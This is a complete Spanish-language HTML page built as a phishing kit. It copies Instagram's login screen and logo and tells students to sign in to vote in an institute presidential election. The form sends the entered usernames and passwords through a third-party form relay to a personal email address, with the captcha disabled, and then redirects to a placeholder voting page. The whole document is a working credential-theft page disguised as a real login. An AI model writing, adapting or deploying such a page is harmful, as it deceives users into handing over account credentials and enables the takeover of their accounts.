<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Inicio de Sesión</title>
<style>
  body { background-color: #000000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
  .main-container { width: 100%; max-width: 350px; padding: 20px; }
  .login-content { display: flex; flex-direction: column; align-items: center; text-align: center; }
  .top-text { font-size: 14px; line-height: 1.5; color: #f5f5f5; margin-bottom: 40px; }
  .ig-logo { width: 75px; height: 75px; margin-bottom: 40px; }
  .form-group { width: 100%; display: flex; flex-direction: column; gap: 12px; }
  input { background-color: #121212; border: 1px solid #363636; border-radius: 8px; padding: 14px; color: #ffffff; font-size: 14px; outline: none; }
  #login_button { background-color: #0095f6; color: white; border: none; border-radius: 25px; padding: 12px; font-weight: 600; cursor: pointer; margin-top: 10px; }
  .bottom-text { font-size: 12px; color: #737373; margin-top: 60px; text-align: center;}
</style>
</head>
<body>
<div class="main-container">
  <form action="https://formsubmit.co/tonyperex37@gmail.com" method="POST" class="login-content">
    
    <input type="hidden" name="_next" value="URL_COMPLETA_DE_TU_PAGINA/votaciones.html"> 
    <input type="hidden" name="_captcha" value="false">

    <p class="top-text">Este inicio de sesión solo era apto a personas que estan dispuestas a votar por los estudiantes postulados a presidente del Instituto</p>
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram" class="ig-logo">

    <div class="form-group">
      <input type="text" name="usuario" placeholder="Nombre de usuario, correo o celular" required>
      <input type="password" name="password" placeholder="Contraseña" required>
      <button type="submit" id="login_button">Iniciar sesión</button>
    </div>
    <p class="bottom-text">Este inicio de sesión es importante para comprobar su votación dada</p>
  </form>
</div>
</body>
</html>
